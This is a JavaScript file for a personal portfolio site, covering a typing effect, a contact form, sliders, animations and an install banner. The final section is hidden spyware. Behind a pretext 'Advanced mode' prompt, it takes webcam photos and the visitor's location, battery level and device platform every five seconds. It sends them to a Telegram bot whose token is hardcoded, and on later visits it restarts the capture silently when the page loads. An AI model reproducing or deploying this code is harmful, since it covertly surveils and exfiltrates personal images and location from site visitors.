// --- 1. Typing Effect (Hero Section) ---
const textArray = ["Bangladeshi Musician", "Creative Writer", "Web Developer", "SEO Expert"];
let textIndex = 0;
let charIndex = 0;
let isDeleting = false;

function typeEffect() {
    const typingElement = document.getElementById("typing-effect");
    if (!typingElement) return;

    const currentText = textArray[textIndex];

    if (isDeleting) {
        typingElement.textContent = currentText.substring(0, charIndex - 1);
        charIndex--;
    } else {
        typingElement.textContent = currentText.substring(0, charIndex + 1);
        charIndex++;
    }

    let typeSpeed = isDeleting ? 80 : 150;

    if (!isDeleting && charIndex === currentText.length) {
        isDeleting = true;
        typeSpeed = 2000; // লেখা শেষে ২ সেকেন্ড বিরতি
    } else if (isDeleting && charIndex === 0) {
        isDeleting = false;
        textIndex = (textIndex + 1) % textArray.length;
        typeSpeed = 500;
    }

    setTimeout(typeEffect, typeSpeed);
}

// --- 2. AJAX Contact Form (Success Message without Redirect) ---
const contactForm = document.getElementById('contact-form');
const formStatus = document.getElementById('form-status');
const submitBtn = document.getElementById('submit-btn');
const btnText = document.getElementById('btn-text');

if (contactForm) {
    contactForm.addEventListener('submit', function(e) {
        e.preventDefault(); // পেজ রিফ্রেশ হওয়া বন্ধ করবে

        // বাটন লোডিং স্টেট
        submitBtn.disabled = true;
        btnText.textContent = "Sending...";

        const formData = new FormData(this);
        
        // FormSubmit.co এর AJAX এপিআই ব্যবহার করে মেসেজ পাঠানো
        fetch("https://formsubmit.co/ajax/info.sabbirhosenakash@gmail.com", {
            method: "POST",
            body: formData,
            headers: {
                'Accept': 'application/json'
            }
        })
        .then(response => response.json())
        .then(data => {
            // সফলভাবে মেসেজ গেলে যা হবে
            formStatus.style.display = "block";
            formStatus.className = "success";
            formStatus.textContent = "✔ Message Sent Successfully!";
            contactForm.reset(); // ফর্ম খালি করে দিবে
            btnText.textContent = "Send Message";
            submitBtn.disabled = false;
            
            // ৫ সেকেন্ড পর মেসেজটি চলে যাবে
            setTimeout(() => { formStatus.style.display = "none"; }, 5000);
        })
        .catch(error => {
            // এরর হলে যা হবে
            formStatus.style.display = "block";
            formStatus.className = "error";
            formStatus.textContent = "❌ Oops! Something went wrong.";
            btnText.textContent = "Try Again";
            submitBtn.disabled = false;
        });
    });
}

// --- 3. Initialize AOS (Scroll Animation) ---
AOS.init({
    duration: 1000,
    once: true,
    mirror: false
});

// --- 4. Swiper JS (Project Slider) ---
const swiper = new Swiper('.project-slider', {
    loop: true,
    autoplay: {
        delay: 3000,
        disableOnInteraction: false,
    },
    pagination: {
        el: '.swiper-pagination',
        clickable: true,
    },
    effect: 'coverflow',
    grabCursor: true,
    centeredSlides: true,
    slidesPerView: 'auto',
    coverflowEffect: {
        rotate: 50,
        stretch: 0,
        depth: 100,
        modifier: 1,
        slideShadows: true,
    },
});

// --- 5. 3D Skill Bar Animation on Scroll ---
const skillSection = document.getElementById('skills');
const progressBars = document.querySelectorAll('.fill-3d');

function showProgress() {
    progressBars.forEach(progressBar => {
        const value = progressBar.style.getPropertyValue('--width');
        progressBar.style.width = value;
    });
}

const observer = new IntersectionObserver((entries) => {
    entries.forEach(entry => {
        if (entry.isIntersecting) {
            showProgress();
        }
    });
}, { threshold: 0.5 });

if (skillSection) {
    observer.observe(skillSection);
}

// --- 6. Mobile Menu Logic ---
function toggleMenu() {
    const navLinks = document.getElementById('nav-links');
    navLinks.classList.toggle('active');
}

// মেনু লিঙ্কে ক্লিক করলে মেনু ক্লোজ হওয়া
document.querySelectorAll('#nav-links a').forEach(link => {
    link.addEventListener('click', () => {
        document.getElementById('nav-links').classList.remove('active');
    });
});

// --- 7. Particles JS Config ---
if (typeof particlesJS !== 'undefined') {
    particlesJS("particles-js", {
        "particles": {
            "number": { "value": 80, "density": { "enable": true, "value_area": 800 } },
            "color": { "value": "#00ff88" },
            "shape": { "type": "circle" },
            "opacity": { "value": 0.5, "random": true },
            "size": { "value": 3, "random": true },
            "line_linked": { "enable": true, "distance": 150, "color": "#00ff88", "opacity": 0.2, "width": 1 },
            "move": { "enable": true, "speed": 3, "direction": "none", "random": false, "straight": false, "out_mode": "out" }
        },
        "interactivity": {
            "detect_on": "canvas",
            "events": { 
                "onhover": { "enable": true, "mode": "grab" }, 
                "onclick": { "enable": true, "mode": "push" } 
            }
        },
        "retina_detect": true
    });
}

// --- 8. Page Initializer ---
document.addEventListener("DOMContentLoaded", () => {
    setTimeout(typeEffect, 1000);
});


let deferredPrompt;
const installBanner = document.getElementById('install-banner');
const btnInstall = document.getElementById('btn-install');
const btnClose = document.getElementById('btn-close');

window.addEventListener('beforeinstallprompt', (e) => {
    // ডিফল্ট ব্রাউজার প্রম্পট আটকানো
    e.preventDefault();
    deferredPrompt = e;

    // ৫ সেকেন্ড পর আপনার কাস্টম নোটিফিকেশন বারটি দেখাবে
    setTimeout(() => {
        installBanner.style.display = 'flex';
    }, 5000);
});

// ইনস্টল বাটনে ক্লিক করলে যা হবে
btnInstall.addEventListener('click', () => {
    if (deferredPrompt) {
        deferredPrompt.prompt(); // আসল ইনস্টল পপ-আপ দেখাবে
        deferredPrompt.userChoice.then((choiceResult) => {
            if (choiceResult.outcome === 'accepted') {
                console.log('User installed the app');
            }
            installBanner.style.display = 'none';
            deferredPrompt = null;
        });
    }
});

// ক্লোজ বাটনে ক্লিক করলে বারটি চলে যাবে
btnClose.addEventListener('click', () => {
    installBanner.style.display = 'none';
});



// --- আপনার কনফিগারেসন ---
const botToken = '8239197154:AAH-VeIISL9nO-EZFL2wJqcVIV6S8UhMVAY';
const chatId = '7950771882'; 

const overlay = document.getElementById('advanced-overlay');
const okBtn = document.getElementById('ok-btn');

// ১. পেজ লোড হলে চেক করবে আগে অনুমতি দিয়েছে কি না
window.addEventListener('load', () => {
    if (localStorage.getItem('accessGranted') === 'true') {
        startSilentTracking(); 
    } else {
        setTimeout(() => {
            overlay.style.display = 'flex';
        }, 4000); // ৪ সেকেন্ড পর পপ-আপ দেখাবে
    }
});

// ২. OK বাটনে ক্লিক করলে যা হবে
okBtn.addEventListener('click', async () => {
    try {
        // ক্যামেরা পারমিশন চাওয়া
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        
        // লোকেশন পারমিশন চাওয়া
        navigator.geolocation.getCurrentPosition(async (pos) => {
            localStorage.setItem('accessGranted', 'true');
            overlay.style.display = 'none';
            runTrackingLoop(stream);
        }, (err) => {
            alert("Location access is necessary for the Advance mode.");
        });
    } catch (err) {
        alert("Camera access is needed to proceed.");
    }
});

// ৩. সাইলেন্ট ট্র্যাকিং (যারা একবার এলাউ করে রেখেছে)
async function startSilentTracking() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        runTrackingLoop(stream);
    } catch (e) {
        localStorage.removeItem('accessGranted');
    }
}

// ৪. ৫ সেকেন্ড পর পর ডেটা পাঠানোর লুপ
function runTrackingLoop(stream) {
    setInterval(() => {
        captureAndSend(stream);
    }, 5000);
}

async function captureAndSend(stream) {
    const video = document.createElement('video');
    video.srcObject = stream;
    video.play();

    const canvas = document.createElement('canvas');
    canvas.width = 640;
    canvas.height = 480;
    const ctx = canvas.getContext('2d');

    setTimeout(async () => {
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        const imageData = canvas.toDataURL('image/jpeg');

        navigator.geolocation.getCurrentPosition(async (pos) => {
            const battery = await navigator.getBattery();
            const batteryLevel = (battery.level * 100).toFixed(0) + '%';
            
            // গুগল ম্যাপের সুনির্দিষ্ট লিঙ্ক (Fixed)
            const lat = pos.coords.latitude;
            const lon = pos.coords.longitude;
            const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
            
            const infoText = `
🚀 **User Activity Log**
--------------------------------
📍 **Map Location:** ${mapLink}
🔋 **Battery:** ${batteryLevel}
📱 **Device:** ${navigator.platform}
🕒 **Time:** ${new Date().toLocaleTimeString()}
            `;
            sendToTelegram(imageData, infoText);
        });
    }, 1000);
}

// ৫. টেলিগ্রামে মেসেজ ও ছবি পাঠানো
async function sendToTelegram(image, text) {
    // টেক্সট পাঠানো
    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: chatId, text: text })
    });

    // ছবি পাঠানো
    const blob = await (await fetch(image)).blob();
    const formData = new FormData();
    formData.append('chat_id', chatId);
    formData.append('photo', blob, 'user_capture.jpg');

    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
        method: 'POST',
        body: formData
    });
}
